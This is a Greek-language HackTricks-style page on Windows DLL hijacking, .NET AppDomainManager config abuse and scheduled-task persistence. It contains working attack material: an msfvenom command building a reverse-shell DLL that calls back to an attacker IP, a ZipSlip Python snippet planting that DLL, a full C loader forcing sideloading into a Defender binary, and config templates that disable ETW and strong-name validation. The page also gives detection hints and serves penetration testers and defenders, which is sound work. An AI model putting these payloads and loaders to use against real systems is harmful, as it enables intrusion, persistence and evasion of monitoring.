# DLL Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές πληροφορίες

Το DLL Hijacking περιλαμβάνει τον χειρισμό μιας έμπιστης εφαρμογής ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος περιλαμβάνει διάφορες τακτικές, όπως **DLL Spoofing, Injection και Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη persistence και, λιγότερο συχνά, κλιμάκωση προνομίων. Παρότι εδώ η έμφαση είναι στην κλιμάκωση, η μέθοδος hijacking παραμένει ίδια ανεξάρτητα από τον στόχο.

### Συνήθεις τεχνικές

Για το DLL hijacking χρησιμοποιούνται διάφορες μέθοδοι, καθεμία από τις οποίες είναι αποτελεσματική ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά με χρήση DLL Proxying ώστε να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε μια διαδρομή αναζήτησης πριν από το νόμιμο, εκμεταλλευόμενοι το μοτίβο αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL που θα φορτώσει μια εφαρμογή, θεωρώντας ότι πρόκειται για ένα απαιτούμενο DLL που δεν υπάρχει.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης, όπως τα `%PATH%` ή τα αρχεία `.exe.manifest` / `.exe.local`, ώστε να κατευθυνθεί η εφαρμογή στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο αντίστοιχο στον κατάλογο WinSxS, μια μέθοδος που συχνά συνδέεται με το DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε έναν κατάλογο που ελέγχει ο χρήστης, μαζί με την αντιγραμμένη εφαρμογή, κατά τρόπο παρόμοιο με τις τεχνικές Binary Proxy Execution.

Μια εφαρμογή μπορεί επίσης να υλοποιεί τον **δικό της loader DLL**. Μια προνομιούχα διεργασία μπορεί να απαριθμεί έναν υποκατάλογο, όπως `Libraries` ή `Plugins`, και να περνά ένα επιλεγμένο DLL σε ένα βοηθητικό πρόγραμμα, ανεξάρτητα από τη συνήθη σειρά αναζήτησης DLL των Windows. Αν ένας άλλος λογαριασμός μπορεί να δημιουργεί αρχεία στον συγκεκριμένο κατάλογο, αντιμετωπίστε το ως ένδειξη προς διερεύνηση: επιβεβαιώστε την ταυτότητα της διεργασίας, τα πραγματικά ACL του καταλόγου, τον κανόνα επιλογής αρχείων και αν είναι δυνατή η εκτέλεση της λειτουργίας φόρτωσης. Το γεγονός ότι ένας κατάλογος δίπλα σε ένα εκτελέσιμο είναι εγγράψιμος δεν αποδεικνύει ότι η διεργασία φορτώνει DLL από εκεί.

{{#ref}}
windows-cpython-build-landmark-sys-path-hijacking.md
{{#endref}}


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Το κλασικό DLL sideloading δεν είναι ο μόνος τρόπος για να φορτωθεί κώδικας επιτιθέμενου σε μια έμπιστη διεργασία **.NET Framework**. Αν το εκτελέσιμο-στόχος είναι **managed** εφαρμογή, το CLR συμβουλεύεται επίσης ένα **αρχείο ρυθμίσεων εφαρμογής** με όνομα που βασίζεται στο εκτελέσιμο (για παράδειγμα, `Setup.exe.config`). Αυτό το αρχείο μπορεί να ορίζει ένα προσαρμοσμένο **AppDomainManager**. Αν η ρύθμιση δείχνει σε ένα assembly που ελέγχει ο επιτιθέμενος και βρίσκεται δίπλα στο EXE, το CLR το φορτώνει **πριν από τη συνήθη ροή εκτέλεσης της εφαρμογής** και εκτελείται μέσα στην έμπιστη διεργασία.<sup>[[24]](#references)</sup>

Σύμφωνα με το σχήμα ρυθμίσεων του .NET Framework της Microsoft, πρέπει να υπάρχουν και τα δύο, τα `<appDomainManagerAssembly>` και `<appDomainManagerType>`, για να χρησιμοποιηθεί ο προσαρμοσμένος manager.<sup>[[16]](#references)[[17]](#references)</sup>

Ελάχιστη ρύθμιση:

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="EvilMgr.Loader" />
  </runtime>
</configuration>
```

Ελάχιστος διαχειριστής:

```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
  [DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
  public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
    MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
  }
}
```

Πρακτικές σημειώσεις:
- Αυτή η τεχνική αφορά ειδικά το **.NET Framework**. Βασίζεται στην ανάλυση της ρύθμισης του CLR και όχι στη σειρά αναζήτησης DLL του Win32.
- Ο host πρέπει να είναι όντως ένα **managed EXE**. Γρήγορο triage: `sigcheck -m target.exe`, `corflags target.exe` ή έλεγχος για την **CLR Runtime Header** στα PE metadata.
- Το όνομα του config αρχείου πρέπει να ταιριάζει ακριβώς με το όνομα του εκτελέσιμου (`<binary>.config`) και συνήθως βρίσκεται **δίπλα στο EXE**.
- Αυτό είναι χρήσιμο με **υπογεγραμμένα binaries της Microsoft ή προμηθευτών**, επειδή το έμπιστο EXE παραμένει ανέπαφο, ενώ το κακόβουλο managed assembly εκτελείται in-process.
- Αν έχετε ήδη εγγράψιμο κατάλογο installer/update, το AppDomainManager hijacking μπορεί να χρησιμοποιηθεί ως **πρώτο στάδιο**, ακολουθούμενο από κλασικό DLL sideloading ή reflective loading για τα επόμενα στάδια.

### Το AppDomainManager ως downloader + bootstrap για scheduled task

Ένα πρακτικό μοτίβο εισβολής είναι ο συνδυασμός του έμπιστου managed EXE με ένα κακόβουλο `*.config` και ένα κακόβουλο DLL AppDomainManager που λειτουργεί μόνο ως **μικρός bootstrapper**:<sup>[[25]](#references)</sup>

1. Ο χρήστης εκκινεί έναν υπογεγραμμένο .NET installer ή updater από μια εύλογη τοποθεσία, όπως το `%USERPROFILE%\Downloads`.
2. Το παρακείμενο config αναγκάζει το CLR να φορτώσει το assembly του attacker **πριν ξεκινήσει η λογική της νόμιμης εφαρμογής**.
3. Ο κακόβουλος manager εκτελεί έναν **έλεγχο διαδρομής** (για παράδειγμα, συνεχίζει μόνο αν το host EXE εκτελείται από το `Downloads` και επιτρέπει την εκτέλεση του δεύτερου σταδίου μόνο από το `%LOCALAPPDATA%`).
4. Αν ο έλεγχος περάσει, κατεβάζει το πραγματικό payload σε μια διαδρομή εγγράψιμη από τον χρήστη, όπως `%LOCALAPPDATA%\PerfWatson2.exe`, και εγκαθιστά persistence με scheduled task.

Γιατί έχει σημασία αυτή η παραλλαγή:
- Το υπογεγραμμένο host EXE παραμένει αμετάβλητο, οπότε το triage που ελέγχει μόνο τα hashes του κύριου binary μπορεί να μην εντοπίσει την παραβίαση.
- Η απλή **ανάλυση κατά της διαδρομής** είναι συνηθισμένη: η μεταφορά της τριάδας ZIP/EXE/DLL στην επιφάνεια εργασίας, στο Temp ή σε διαδρομή sandbox μπορεί να διακόψει σκόπιμα την αλυσίδα.
- Το DLL AppDomainManager του πρώτου σταδίου μπορεί να παραμείνει μικρό και διακριτικό, ενώ το πραγματικό implant λαμβάνεται αργότερα.

Ελάχιστο παράδειγμα persistence που συναντάται συχνά με αυτό το μοτίβο:

```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```

Notes:
- ` /rl highest` σημαίνει **το υψηλότερο διαθέσιμο επίπεδο** για τον συγκεκριμένο χρήστη/συνεδρία· από μόνο του δεν εγγυάται κλιμάκωση σε SYSTEM.
- Αυτή η τεχνική ταξινομείται συχνά καλύτερα ως **εκτέλεση/διατήρηση μέσω κατάχρησης ρυθμίσεων .NET** παρά ως κλασικό DLL hijacking λόγω σειράς αναζήτησης, παρόλο που οι operators συχνά συνδυάζουν και τις δύο τεχνικές.

Σημεία ανίχνευσης:
- Υπογεγραμμένα εκτελέσιμα .NET που εκκινούνται από **διαδρομές εξαγωγής ZIP**, `Downloads`, `%TEMP%` ή άλλους φακέλους εγγράψιμους από τον χρήστη, μαζί με ένα `<exe>.config` **στον ίδιο φάκελο**.
- Νέες προγραμματισμένες εργασίες των οποίων η ενέργεια δείχνει σε `%LOCALAPPDATA%`, `%APPDATA%` ή `Downloads` και των οποίων τα ονόματα μιμούνται προγράμματα ενημέρωσης browser/προμηθευτών.
- Βραχύβιες managed διεργασίες bootstrap που κατεβάζουν αμέσως ένα άλλο EXE και κατόπιν εκκινούν το `schtasks.exe`.
- Δείγματα που τερματίζονται νωρίς, εκτός αν η διαδρομή του εκτελέσιμου αντιστοιχεί σε αναμενόμενο κατάλογο προφίλ χρήστη.

### Παραβίαση υπάρχουσας προγραμματισμένης εργασίας για επανεκκίνηση της αλυσίδας sideload

Για διατήρηση, μην ψάχνετε μόνο για **δημιουργία νέας εργασίας**. Ορισμένες ομάδες εισβολής περιμένουν να δημιουργήσει ένα νόμιμο πρόγραμμα εγκατάστασης μια **κανονική εργασία ενημέρωσης** και κατόπιν **αλλάζουν την ενέργεια της εργασίας**, ώστε το υπάρχον όνομα, ο συντάκτης και το έναυσμα να παραμένουν οικεία στους αμυνόμενους.

Επαναχρησιμοποιήσιμη ροή εργασίας:
1. Εγκαταστήστε/εκτελέστε το νόμιμο λογισμικό και εντοπίστε την εργασία που δημιουργεί κανονικά.
2. Εξαγάγετε το XML της εργασίας και σημειώστε τις τρέχουσες τιμές `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Αντικαταστήστε μόνο την ενέργεια, ώστε η εργασία να εκκινεί το **έμπιστο host EXE** από έναν προσωρινό κατάλογο εγγράψιμο από τον χρήστη, το οποίο κατόπιν κάνει side-load ή φορτώνει μέσω AppDomain το πραγματικό payload.
4. Εγγράψτε ξανά την ίδια εργασία αντί να δημιουργήσετε ένα νέο, προφανές τεχνούργημα διατήρησης.

```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```

Γιατί είναι πιο δυσδιάκριτο:
- Το όνομα της εργασίας μπορεί να φαίνεται νόμιμο (για παράδειγμα, πρόγραμμα ενημέρωσης προμηθευτή).
- Η εκκίνηση γίνεται από την **υπηρεσία Task Scheduler**, οπότε η επικύρωση γονικής διεργασίας/προγόνων συχνά εντοπίζει την αναμενόμενη αλυσίδα προγραμματισμού αντί για το `explorer.exe`.
- Οι ομάδες DFIR που αναζητούν μόνο **νέα ονόματα εργασιών** μπορεί να παραβλέψουν μια εργασία της οποίας η καταχώριση υπήρχε ήδη, αλλά η ενέργειά της δείχνει πλέον στο `%LOCALAPPDATA%`, `%APPDATA%` ή σε άλλη διαδρομή που ελέγχει ο εισβολέας.

Γρήγορα σημεία διερεύνησης:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Συγκρίνετε τα XML των `C:\Windows\System32\Tasks\*` και τα μεταδεδομένα του `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` με μια βασική γραμμή αναφοράς.
- Δημιουργήστε ειδοποίηση όταν μια εργασία ενημέρωσης που **μοιάζει να προέρχεται από προμηθευτή** εκτελείται από **καταλόγους εγγράψιμους από χρήστες** ή εκκινεί ένα .NET EXE με ένα γειτονικό αρχείο `*.config`.

> [!TIP]
> Για μια αλυσίδα βήμα προς βήμα που συνδυάζει HTML staging, configs AES-CTR και .NET implants με DLL sideloading, δείτε την παρακάτω ροή εργασίας.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Εντοπισμός DLL που λείπουν

Ο πιο συνηθισμένος τρόπος εντοπισμού DLL που λείπουν σε ένα σύστημα είναι να εκτελέσετε το [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από το sysinternals, **ορίζοντας** τα **ακόλουθα 2 φίλτρα**:

![Κοινές τεχνικές - Εντοπισμός DLL που λείπουν: Ο πιο συνηθισμένος τρόπος εντοπισμού DLL που λείπουν σε ένα σύστημα είναι να εκτελέσετε το procmon από το sysinternals, ορίζοντας τα ακόλουθα 2 φίλτρα](<../../../images/image (961).png>)

![Κοινές τεχνικές - Εντοπισμός DLL που λείπουν: Ο πιο συνηθισμένος τρόπος εντοπισμού DLL που λείπουν σε ένα σύστημα είναι να εκτελέσετε το procmon από το sysinternals, ορίζοντας τα ακόλουθα 2 φίλτρα](<../../../images/image (230).png>)

και να εμφανίσετε μόνο τη **δραστηριότητα συστήματος αρχείων**:

![Κοινές τεχνικές - Εντοπισμός DLL που λείπουν: και να εμφανίσετε μόνο τη δραστηριότητα συστήματος αρχείων](<../../../images/image (153).png>)

Αν αναζητάτε **DLL που λείπουν γενικά**, **αφήστε** το να εκτελείται για μερικά **δευτερόλεπτα**.\
Αν αναζητάτε ένα **DLL που λείπει μέσα σε συγκεκριμένο εκτελέσιμο αρχείο**, ορίστε ένα ακόμη φίλτρο, όπως **"Process Name" "contains" `<exec name>`**, εκτελέστε το και σταματήστε την καταγραφή συμβάντων.<sup>[[9]](#references)</sup>

## Εκμετάλλευση DLL που λείπουν

Για να κλιμακώσετε προνόμια, αναζητήστε ένα **DLL που μια προνομιούχα διεργασία επιχειρεί να φορτώσει** από μια τοποθεσία στην οποία μπορείτε να γράψετε. Αυτό μπορεί να συμβεί όταν ελέγχετε έναν κατάλογο που αναζητείται πριν από τον κατάλογο που περιέχει το νόμιμο DLL ή όταν το ζητούμενο DLL δεν υπάρχει και μπορείτε να γράψετε σε έναν από τους καταλόγους που αναζητούνται.

### Σειρά αναζήτησης DLL

**Στην** [**τεκμηρίωση της Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείτε να βρείτε λεπτομέρειες για τον τρόπο φόρτωσης των DLL.**

Οι **εφαρμογές των Windows** αναζητούν DLL ακολουθώντας ένα σύνολο από **προκαθορισμένες διαδρομές αναζήτησης**, με συγκεκριμένη σειρά. Το DLL hijacking προκύπτει όταν ένα κακόβουλο DLL τοποθετείται στρατηγικά σε έναν από αυτούς τους καταλόγους, ώστε να φορτωθεί πριν από το αυθεντικό DLL. Για να αποτραπεί αυτό, βεβαιωθείτε ότι η εφαρμογή χρησιμοποιεί απόλυτες διαδρομές όταν αναφέρεται στα DLL που χρειάζεται.

Παρακάτω εμφανίζεται η **σειρά αναζήτησης DLL σε συστήματα 32-bit**:

1. Ο κατάλογος από τον οποίο φορτώθηκε η εφαρμογή.
2. Ο κατάλογος συστήματος. Χρησιμοποιήστε τη συνάρτηση [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) για να λάβετε τη διαδρομή αυτού του καταλόγου.(_C:\Windows\System32_)
3. Ο κατάλογος συστήματος 16-bit. Δεν υπάρχει συνάρτηση που να επιστρέφει τη διαδρομή αυτού του καταλόγου, αλλά γίνεται αναζήτηση σε αυτόν. (_C:\Windows\System_)
4. Ο κατάλογος των Windows. Χρησιμοποιήστε τη συνάρτηση [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) για να λάβετε τη διαδρομή αυτού του καταλόγου.
   1. (_C:\Windows_)
5. Ο τρέχων κατάλογος.
6. Οι κατάλογοι που αναφέρονται στη μεταβλητή περιβάλλοντος PATH. Σημειώστε ότι αυτό δεν περιλαμβάνει τη διαδρομή ανά εφαρμογή που καθορίζεται από το κλειδί μητρώου **App Paths**. Το κλειδί **App Paths** δεν χρησιμοποιείται κατά τον υπολογισμό της διαδρομής αναζήτησης DLL.

Αυτή είναι η **προεπιλεγμένη** σειρά αναζήτησης με ενεργοποιημένο το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, ο τρέχων κατάλογος ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτήν τη λειτουργία, δημιουργήστε την τιμή μητρώου **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και ορίστε την σε 0 (η προεπιλογή είναι ενεργοποιημένη).

Αν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) κληθεί με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινά από τον κατάλογο της μονάδας εκτελέσιμου αρχείου που φορτώνει η **LoadLibraryEx**.

Τέλος, ένα DLL μπορεί να φορτωθεί μέσω απόλυτης διαδρομής αντί με το όνομά του. Σε αυτήν την περίπτωση, τα Windows αναζητούν το ίδιο το DLL μόνο σε αυτήν τη διαδρομή· οι εξαρτήσεις που ζητούνται με βάση το όνομα εξακολουθούν να ακολουθούν την αντίστοιχη σειρά αναζήτησης.

Υπάρχουν κι άλλοι τρόποι τροποποίησης της σειράς αναζήτησης, αλλά δεν θα τους εξηγήσω εδώ.

### Αλυσιδωτή αξιοποίηση αυθαίρετης εγγραφής αρχείου για hijack μέσω DLL που λείπει

**Σχετική τεχνική:** [oplock-gated mount-point switching against privileged remediation](../kernel-race-condition-object-manager-slowdown.md#applied-chain-oplock-gated-mount-point-switch-against-privileged-remediation).

1. Χρησιμοποιήστε φίλτρα του **ProcMon** (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) για να συλλέξετε ονόματα DLL που αναζητά η διεργασία αλλά δεν βρίσκει.<sup>[[14]](#references)</sup>
2. Αν το binary εκτελείται **βάσει προγράμματος ή ως υπηρεσία**, η τοποθέτηση ενός DLL με ένα από αυτά τα ονόματα στον **κατάλογο της εφαρμογής** (θέση #1 στη σειρά αναζήτησης) θα έχει ως αποτέλεσμα τη φόρτωσή του στην επόμενη εκτέλεση. Σε μία περίπτωση .NET scanner, η διεργασία αναζητούσε το `hostfxr.dll` στο `C:\samples\app\` πριν φορτώσει το πραγματικό αντίγραφο από το `C:\Program Files\dotnet\fxr\...`.
3. Δημιουργήστε ένα DLL payload (π.χ. reverse shell) με οποιοδήποτε export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Αν η primitive σας είναι **αυθαίρετη εγγραφή τύπου ZipSlip**, δημιουργήστε ένα ZIP του οποίου η καταχώριση διαφεύγει από τον κατάλογο εξαγωγής, ώστε το DLL να καταλήξει στον φάκελο της εφαρμογής:

```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
    z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```

5. Παραδώστε το archive στο παρακολουθούμενο inbox/share· όταν η προγραμματισμένη εργασία επανεκκινήσει τη διεργασία, αυτή φορτώνει το κακόβουλο DLL και εκτελεί τον κώδικά σας με τα δικαιώματα του λογαριασμού υπηρεσίας.

### Εξαναγκασμός sideloading μέσω του RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προηγμένος τρόπος για να επηρεάσετε με αξιόπιστο τρόπο τη διαδρομή αναζήτησης DLL μιας νεοδημιουργημένης διεργασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS κατά τη δημιουργία της διεργασίας, χρησιμοποιώντας τα native APIs του ntdll. Αν ορίσετε εδώ έναν κατάλογο που ελέγχετε, μια διεργασία-στόχος που επιλύει το όνομα ενός εισαγόμενου DLL (χωρίς απόλυτη διαδρομή και χωρίς να χρησιμοποιεί τις ασφαλείς σημαίες φόρτωσης) μπορεί να εξαναγκαστεί να φορτώσει ένα κακόβουλο DLL από αυτόν τον κατάλογο.

Βασική ιδέα
- Δημιουργήστε τις παραμέτρους της διεργασίας με το RtlCreateProcessParametersEx και δώστε ένα προσαρμοσμένο DllPath που δείχνει στον φάκελο που ελέγχετε (π.χ. τον κατάλογο όπου βρίσκεται το dropper/unpacker σας).
- Δημιουργήστε τη διεργασία με το RtlCreateUserProcess. Όταν το δυαδικό αρχείο-στόχος επιλύσει το όνομα ενός DLL, ο loader θα ελέγξει κατά την επίλυση το DllPath που δώσατε, επιτρέποντας αξιόπιστο sideloading ακόμη κι όταν το κακόβουλο DLL δεν βρίσκεται στον ίδιο κατάλογο με το target EXE.

Σημειώσεις/περιορισμοί
- Αυτό επηρεάζει τη θυγατρική διεργασία που δημιουργείται· διαφέρει από το SetDllDirectory, το οποίο επηρεάζει μόνο την τρέχουσα διεργασία.
- Ο στόχος πρέπει να εισάγει ή να φορτώνει με LoadLibrary ένα DLL βάσει ονόματος (χωρίς απόλυτη διαδρομή και χωρίς να χρησιμοποιεί τα LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Τα KnownDLLs και οι hardcoded απόλυτες διαδρομές δεν μπορούν να γίνουν hijack. Τα forwarded exports και το SxS ενδέχεται να αλλάξουν την προτεραιότητα.

Ελάχιστο παράδειγμα C (ntdll, wide strings, απλοποιημένος χειρισμός σφαλμάτων):

<details>
<summary>Πλήρες παράδειγμα C: εξαναγκασμός DLL sideloading μέσω RTL_USER_PROCESS_PARAMETERS.DllPath</summary>

```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
    // Target Microsoft-signed, DLL-hijackable binary (example)
    const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

    // Build custom DllPath = directory of our current module (e.g., the unpacked archive)
    wchar_t dllDir[MAX_PATH];
    DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, image);
    RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
    RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
    RtlInitUnicodeString(&uCurDir, dllDir);

    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
                                                NULL, NULL, NULL, NULL, NULL, 0);
    if (st < 0) return 1;

    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
    if (st < 0) return 1;

    // Resume main thread etc. if created suspended (not shown here)
    return 0;
}
```

</details>

Παράδειγμα επιχειρησιακής χρήσης
- Τοποθετήστε ένα κακόβουλο xmllite.dll (που εξάγει τις απαιτούμενες συναρτήσεις ή λειτουργεί ως proxy προς την πραγματική DLL) στον κατάλογο DllPath.
- Εκκινήστε ένα υπογεγραμμένο binary που είναι γνωστό ότι αναζητά το xmllite.dll βάσει ονόματος, χρησιμοποιώντας την παραπάνω τεχνική. Ο loader επιλύει το import μέσω του καθορισμένου DllPath και κάνει sideload τη DLL σας.

Η τεχνική αυτή έχει παρατηρηθεί στην πράξη ως μέσο για την υλοποίηση αλυσίδων sideloading πολλαπλών σταδίων: ένας αρχικός launcher αφήνει μια βοηθητική DLL, η οποία στη συνέχεια εκκινεί ένα binary υπογεγραμμένο από τη Microsoft και ευάλωτο σε hijacking, με προσαρμοσμένο DllPath, ώστε να εξαναγκάσει τη φόρτωση της DLL του attacker από έναν κατάλογο staging.<sup>[[6]](#references)</sup>


### Hijacking του .NET AppDomainManager μέσω `.exe.config`

Για στόχους **.NET Framework**, το sideloading μπορεί να γίνει **πριν από τη `Main()`**, χωρίς τροποποίηση της μνήμης, μέσω κατάχρησης του γειτονικού αρχείου **`.exe.config`** της εφαρμογής. Αντί να βασιστεί μόνο στη σειρά αναζήτησης DLL του Win32, ο attacker τοποθετεί ένα νόμιμο .NET EXE δίπλα σε ένα κακόβουλο config και μία ή περισσότερες assemblies που ελέγχει.

Πώς λειτουργεί η αλυσίδα:<sup>[[15]](#references)[[22]](#references)</sup>
1. Εκκινείται το host EXE και ο **CLR διαβάζει το `<exe>.config`**.
2. Το config ορίζει τα **`<appDomainManagerAssembly>`** και **`<appDomainManagerType>`**, ώστε το runtime να δημιουργήσει ένα `AppDomainManager` που ελέγχεται από τον attacker.
3. Ο κακόβουλος manager εκτελεί κώδικα **πριν από τη `Main()`** μέσα στην έμπιστη διεργασία host.
4. Το ίδιο config μπορεί να αναγκάσει τον CLR να επιλύει πρώτα τις τοπικές assemblies (για παράδειγμα `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) και να αποδυναμώσει την επικύρωση του runtime και την τηλεμετρία, χωρίς inline patching.

Πρότυπο τύπου campaign (η ακριβής εμφώλευση μπορεί να διαφέρει ανάλογα με την οδηγία / έκδοση CLR):

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="Updater" />
    <appDomainManagerType value="MyAppDomainManager" />
    <assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
      <probing privatePath="." />
      <publisherPolicy apply="no" />
    </assemblyBinding>
    <bypassTrustedAppStrongNames enabled="true" />
    <etwEnable enabled="false" />
  </runtime>
  <startup>
    <requiredRuntime version="v4.0.30319" safemode="true" />
  </startup>
</configuration>
```

Γιατί είναι χρήσιμο:
- **`<probing privatePath="."/>`** διατηρεί την επίλυση assembly στον κατάλογο της εφαρμογής, μετατρέποντας τον φάκελο σε προβλέψιμη επιφάνεια για sideloading.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** μεταφέρουν την εκτέλεση σε κώδικα του επιτιθέμενου κατά την αρχικοποίηση του CLR, πριν εκτελεστεί η νόμιμη λογική της εφαρμογής.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** μπορεί να επιτρέψει σε μια εφαρμογή με full-trust να φορτώσει unsigned ή τροποποιημένα assemblies, χωρίς αποτυχία επικύρωσης strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** αποτρέπει τις ανακατευθύνσεις publisher-policy σε νεότερα assemblies.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** καθιστά πιο προβλέψιμη την επιλογή runtime.<sup>[[21]](#references)</sup>
- Το **`<etwEnable enabled="false"/>`** είναι ιδιαίτερα ενδιαφέρον, επειδή το **CLR απενεργοποιεί τη δική του ορατότητα στο ETW** μέσω των ρυθμίσεων, αντί το implant να τροποποιεί στη μνήμη το `EtwEventWrite`.

Μοτίβο ενεργειών που έχει παρατηρηθεί σε πρόσφατες καμπάνιες:
- Στάδιο 1: Τοποθετεί τα `setup.exe`, `setup.exe.config` και τοπικά assemblies.
- Στάδιο 2: Τα αντιγράφει σε έναν πειστικό φάκελο **ενημέρωσης στο AppData**, μετονομάζει το host σε κάτι όπως `update.exe` και το επανεκκινεί μέσω μιας **scheduled task**.
- Στάδιο 3: Επαληθεύει το πλαίσιο εκτέλεσης (για παράδειγμα, ότι η αναμενόμενη γονική διεργασία είναι το `svchost.exe` που εκκινήθηκε από το Task Scheduler) πριν φορτώσει το τελικό RAT DLL/export.

Ιδέες για εντοπισμό:
- Υπογεγραμμένα ή κατά τα άλλα νόμιμα **εκτελέσιμα .NET** που εκτελούνται με ύποπτα παρακείμενα αρχεία **`.config`** σε τοποθεσίες στις οποίες μπορούν να γράψουν οι χρήστες.
- Αρχεία `.config` που περιέχουν **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** ή **`etwEnable enabled="false"`**.
